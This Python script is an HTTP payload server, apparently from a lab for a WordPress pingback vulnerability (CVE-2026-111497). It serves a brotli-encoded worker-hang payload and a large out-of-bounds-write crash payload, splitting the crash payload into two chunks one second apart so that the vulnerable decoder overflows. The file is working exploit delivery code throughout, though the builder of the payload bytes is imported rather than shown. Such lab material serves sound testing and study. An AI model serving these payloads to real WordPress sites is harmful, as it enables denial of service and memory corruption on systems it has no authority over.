#!/usr/bin/env python3
"""Payload server for the CVE-2026-111497 WordPress pingback lab.

    GET /health      JSON status
    GET /small.br    86-byte worker-hang payload
    GET /payload.br  ~23 MB OOB-write payload (two chunks, 1s apart)

The delay forces a separate BrotliDecoderDecompressStream() call with
``buffer_length == 1``, which the vulnerable decoder needs for the overflow.
"""

from __future__ import annotations

import json
import os
import socket
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

from payload import build_crash_payload, build_hang_payload

PORT = int(os.environ.get("PORT", "8080"))
DELAY = float(os.environ.get("CHUNK_DELAY", "1.0"))
HANG = build_hang_payload()
CRASH = build_crash_payload()
SPLIT = len(CRASH) - 127

print(f"[payload] hang={len(HANG)}B crash={len(CRASH)}B delay={DELAY}s", flush=True)


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "brotli-pingback-lab/1.0"

    def do_GET(self) -> None:  # noqa: N802
        path = urlparse(self.path).path

        if path == "/health":
            body = json.dumps(
                {
                    "status": "ok",
                    "hang_bytes": len(HANG),
                    "crash_bytes": len(CRASH),
                }
            ).encode()
            self._send(200, body, "application/json")
            return

        if path == "/small.br":
            self._send(200, HANG, "application/octet-stream", content_encoding="br")
            return

        if path == "/payload.br":
            self._send_crash()
            return

        self._send(404, b"not found\n", "text/plain; charset=utf-8")

    def _send(
        self,
        status: int,
        body: bytes,
        content_type: str,
        content_encoding: str | None = None,
    ) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        if content_encoding:
            self.send_header("Content-Encoding", content_encoding)
        self.end_headers()
        self.wfile.write(body)

    def _send_crash(self) -> None:
        first, tail = CRASH[:SPLIT], CRASH[SPLIT:]
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Encoding", "br")
        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try:
            self.wfile.write(b"%x\r\n" % len(first))
            self.wfile.write(first)
            self.wfile.write(b"\r\n")
            self.wfile.flush()
            time.sleep(DELAY)
            self.wfile.write(b"%x\r\n" % len(tail))
            self.wfile.write(tail)
            self.wfile.write(b"\r\n0\r\n\r\n")
            self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError, socket.timeout):
            pass

    def log_message(self, fmt: str, *args) -> None:
        print(f"[http] {self.address_string()} {fmt % args}", flush=True)


class Server(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True


if __name__ == "__main__":
    print(f"[http] listening on 0.0.0.0:{PORT}", flush=True)
    Server(("0.0.0.0", PORT), Handler).serve_forever()
